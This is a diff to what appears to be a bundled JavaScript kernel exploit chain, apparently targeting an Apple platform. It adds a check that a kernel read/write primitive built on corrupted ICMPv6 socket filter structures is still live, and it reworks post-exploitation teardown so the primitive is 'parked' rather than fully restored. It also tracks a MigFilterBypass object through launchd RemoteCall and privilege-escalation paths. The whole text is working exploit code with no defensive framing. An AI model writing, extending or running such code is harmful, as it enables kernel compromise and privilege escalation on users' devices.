@@ -1079,6 +1079,55 @@
     control_socket = 0n;
     rw_socket = 0n;
   }
+  function krw_bad_fd_result(ret) {
+    return ret == 0xFFFFFFFFFFFFFFFFn || ret < 0n;
+  }
+  function krw_ready_for_terminal_cleanup() {
+    if (control_socket <= 0n || rw_socket <= 0n ||
+        control_socket == 0xFFFFFFFFFFFFFFFFn || rw_socket == 0xFFFFFFFFFFFFFFFFn) {
+      LOG("[KRW-CLEAN] KRW unavailable: missing socket fds control=" + control_socket + " rw=" + rw_socket);
+      return false;
+    }
+    if (krw_bad_fd_result(fcntl(control_socket, 1n, 0n)) ||
+        krw_bad_fd_result(fcntl(rw_socket, 1n, 0n))) {
+      LOG("[KRW-CLEAN] KRW unavailable: socket fd validation failed");
+      return false;
+    }
+    if (!is_kernel_pointer(control_socket_pcb) || !is_kernel_pointer(rw_socket_pcb)) {
+      LOG("[KRW-CLEAN] KRW unavailable: invalid pcb control=" + control_socket_pcb.hex() + " rw=" + rw_socket_pcb.hex());
+      return false;
+    }
+    if (!is_kernel_pointer(kernel_base)) {
+      LOG("[KRW-CLEAN] KRW unavailable: invalid kernel base=" + kernel_base.hex());
+      return false;
+    }
+
+    let target = calloc(1n, EARLY_KRW_LENGTH);
+    let magic_buf = calloc(1n, 0x8n);
+    try {
+      uwrite64(target, kernel_base);
+      let set_res = setsockopt(control_socket, IPPROTO_ICMPV6, ICMP6_FILTER, target, EARLY_KRW_LENGTH);
+      if (set_res != 0n) {
+        LOG("[KRW-CLEAN] KRW unavailable: setsockopt validation failed res=" + set_res);
+        return false;
+      }
+      let read_len = 0x8n;
+      let get_res = getsockopt(rw_socket, IPPROTO_ICMPV6, ICMP6_FILTER, magic_buf, get_bigint_addr(read_len));
+      if (get_res != 0n) {
+        LOG("[KRW-CLEAN] KRW unavailable: getsockopt validation failed res=" + get_res);
+        return false;
+      }
+      let magic = uread64(magic_buf);
+      if (magic != 0x100000cfeedfacfn) {
+        LOG("[KRW-CLEAN] KRW unavailable: kernel magic mismatch base=" + kernel_base.hex() + " magic=" + magic.hex());
+        return false;
+      }
+      return true;
+    } finally {
+      try { free(target); } catch (_) {}
+      try { free(magic_buf); } catch (_) {}
+    }
+  }
   function krw_terminal_cleanup(reason) {
     if (krw_terminal_cleanup_started) {
       LOG("[KRW-CLEAN] terminal cleanup already attempted" + (reason ? ": " + reason : ""));
@@ -1098,21 +1147,24 @@
       krw_restore_snapshot_clear();
       return false;
     }
+    if (!krw_ready_for_terminal_cleanup()) {
+      LOG("[KRW-CLEAN] KRW primitive unavailable; closing local fds only");
+      krw_close_local_fds();
+      krw_restore_snapshot_clear();
+      return false;
+    }
 
     let restore = calloc(1n, EARLY_KRW_LENGTH);
-    let restored = false;
+    let parked = false;
     try {
-      LOG("[KRW-CLEAN] restoring RW PCB fields");
+      LOG("[KRW-CLEAN] parking RW PCB fields and restoring control checksum");
+      early_kwrite64(control_socket_pcb + ICMP6FILT_OFFSET + 0x8n, krw_restore_control_cksum);
+
       uwrite64(restore, krw_restore_rw_filter);
       uwrite64(restore + 0x8n, krw_restore_rw_cksum);
       early_kwrite32bytes(rw_socket_pcb + ICMP6FILT_OFFSET, restore);
-
-      memset(restore, 0n, EARLY_KRW_LENGTH);
-      uwrite64(restore, krw_restore_control_filter);
-      uwrite64(restore + 0x8n, krw_restore_control_cksum);
-      early_kwrite32bytes(control_socket_pcb + ICMP6FILT_OFFSET, restore);
-      restored = true;
-      LOG("[KRW-CLEAN] current KRW socket fields restored");
+      parked = true;
+      LOG("[KRW-CLEAN] RW parked; control filter left linked by design");
     } catch (e) {
       LOG("[KRW-CLEAN] terminal cleanup failed: " + String(e));
     } finally {
@@ -1121,8 +1173,8 @@
       krw_restore_snapshot_clear();
     }
 
-    LOG("[KRW-CLEAN] terminal cleanup complete restored=" + (restored ? "true" : "false"));
-    return restored;
+    LOG("[KRW-CLEAN] terminal cleanup complete parked=" + (parked ? "true" : "false"));
+    return parked;
   }
   let socket_ports = [];
   let socket_pcb_ids = [];
@@ -10076,6 +10128,7 @@ function start() {
 		mutexPtr = BigInt(libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].callSymbol("malloc", 0x100));
 		libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].callSymbol("pthread_mutex_init", mutexPtr, null);
 		LOG("[PE] Creating MigFilterBypass..."); migFilterBypass = new MigFilterBypass(mutexPtr); LOG("[PE] MigFilterBypass created");
+		globalThis.__ls_active_mig_filter_bypass = migFilterBypass;
 	}
 	let driver = new libs_Driver_Driver__WEBPACK_IMPORTED_MODULE_7__["default"]();
 
@@ -10104,6 +10157,7 @@ function start() {
 		if (migFilterBypass) {
 			LOG("[PE] Stopping MigFilterBypass after launchd RemoteCall failure...");
 			migFilterBypass.stop();
+			globalThis.__ls_active_mig_filter_bypass = null;
 		}
 		try { krw_terminal_cleanup("launchd RemoteCall failure"); } catch (e) { LOG("[KRW-CLEAN] terminal cleanup threw: " + String(e)); }
 		return false;
@@ -11099,6 +11153,7 @@ function start() {
 		if (migFilterBypass) {
 			LOG("[PE] Stopping MigFilterBypass...");
 			migFilterBypass.stop();
+			globalThis.__ls_active_mig_filter_bypass = null;
 		}
 		try { krw_terminal_cleanup("post-exploitation teardown"); } catch (e) { LOG("[KRW-CLEAN] terminal cleanup threw: " + String(e)); }
 	}
@@ -11114,6 +11169,14 @@ catch (error) {
 	LOG("[!] Error: " + (typeof injectError !== "undefined" ? injectError : error));
 }
 finally {
+	try {
+		let activeMigFilterBypass = globalThis.__ls_active_mig_filter_bypass;
+		if (activeMigFilterBypass) {
+			LOG("[PE] Stopping active MigFilterBypass before bundle finalizer cleanup...");
+			activeMigFilterBypass.stop();
+			globalThis.__ls_active_mig_filter_bypass = null;
+		}
+	} catch (e) { LOG("[PE] active MigFilterBypass stop threw: " + String(e)); }
 	try { krw_terminal_cleanup("bundle finalizer"); } catch (e) { LOG("[KRW-CLEAN] terminal cleanup threw: " + String(e)); }
 	libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].callSymbol("exit", 0n);
 }
